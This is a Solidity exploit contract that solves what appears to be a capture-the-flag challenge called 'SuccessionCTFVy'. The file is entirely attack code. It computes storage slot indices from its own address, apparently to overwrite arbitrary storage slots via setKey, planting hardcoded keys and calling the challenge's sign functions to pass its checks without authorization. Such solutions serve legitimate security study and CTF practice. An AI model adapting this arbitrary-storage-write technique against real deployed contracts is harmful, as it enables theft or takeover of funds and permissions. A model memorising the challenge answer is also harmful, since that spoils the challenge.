// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ISuccessionCTFVy} from "src/neumoxx-succession/interfaces/ISuccessionCTFVy.sol";

contract ExploiterNoReentrancy {
    bytes32 constant MARION_KEY = 0x000000000000000000000000000000000000000000000000000000000000bbbb;
    bytes32 constant ANNA_KEY = 0x000000000000000000000000000000000000000000000000000000000000aaaa;
    uint256 immutable keyIndex;
    uint256 immutable blockIndex;

    ISuccessionCTFVy successionCTF;

    constructor(address _successionCTF) {
        successionCTF = ISuccessionCTFVy(_successionCTF);
        keyIndex = 3618502788666131106986593281521497120414687020801267626233049500247285301248 - 11
            - uint256(uint160(address(this)));
        blockIndex = type(uint256).max - 1 - uint256(uint160(address(this)));
    }

    function attack() external {
        // init CTF
        successionCTF.initCTF();

        // sign for HenryJunior
        successionCTF.signHenryJunior(address(this), 0);

        // sign for Marion
        successionCTF.setKey(keyIndex, MARION_KEY);
        successionCTF.setKey(blockIndex, bytes32(0));
        successionCTF.signMarion(address(this), type(uint256).max - 63);

        // sign for Anna
        successionCTF.setKey(keyIndex, ANNA_KEY);
        successionCTF.setKey(blockIndex, bytes32(0));
        successionCTF.signAnna(address(this), type(uint256).max - 63);
    }

    fallback() external payable {}
}
